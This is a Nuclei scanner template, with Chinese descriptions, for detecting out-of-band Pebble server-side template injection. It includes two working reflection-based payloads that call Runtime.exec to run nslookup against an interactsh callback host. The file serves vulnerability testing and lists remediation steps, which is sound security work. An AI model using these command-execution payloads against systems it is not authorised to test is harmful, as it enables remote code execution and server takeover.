id: pebble-oob

info:
  name: Pebble 带外服务端模板注入（DAST）
  author: ritikchaddha
  severity: high
  description: |
    Pebble 服务端模板注入发生在应用把用户输入作为模板语法渲染时，攻击者可借模板表达式访问运行时对象、调用函数或触发外部请求。模板向查询参数和请求体追加/替换 Pebble 专用载荷，并通过 interactsh DNS SRV 外带交互确认表达式在服务端被执行。
  impact: |
    - 攻击者可能在模板引擎上下文中执行命令、读取环境变量、访问应用对象或向外发送敏感信息。
    - 若模板进程具备数据库、文件系统或云资源权限，SSTI 可进一步导致应用服务器被接管。
  remediation: |
    - 不要把用户输入拼接进服务端模板源码；使用安全变量绑定，并将模板文件与用户内容分离。
    - 启用模板沙箱和 allowlist，限制危险对象、反射、命令执行和网络访问，并升级模板引擎到安全版本。
  reference:
    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md#pebble---code-execution
  metadata:
    max-request: 1
  tags: ssti,dast,pebble,vuln

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'
          - 'method == "POST"'
          - 'method == "PUT"'
    payloads:
      injection:
        - "{%25%20set%20cmd%20=%20%27nslookup%20-type=SRV%20{{interactsh-url}}%27%20%25}{%25%20set%20bytes%20%3D%20(1).TYPE.forName(%27java.lang.Runtime%27).methods%5B6%5D.invoke(null,null).exec(cmd).inputStream.readAllBytes()%20%25}{{%20(1).TYPE.forName(%27java.lang.String%27).constructors%5B0%5D.newInstance((%5Bbytes%5D).toArray())%20}}"
        - "{{%20variable.getClass().forName(%27java.lang.Runtime%27).getRuntime().exec(%27nslookup%20-type=SRV%20{{interactsh-url}}%27)%20}}"

    fuzzing:
      - parts:
          - query
          - body
        type: postfix
        mode: single
        fuzz:
          - "{{injection}}"

    skip-variables-check: true
    matchers:
      - type: dsl
        name: request-matcher
        dsl:
          - "contains(interactsh_protocol,'dns')"
          - "contains(interactsh_request,'srv')"
        condition: and
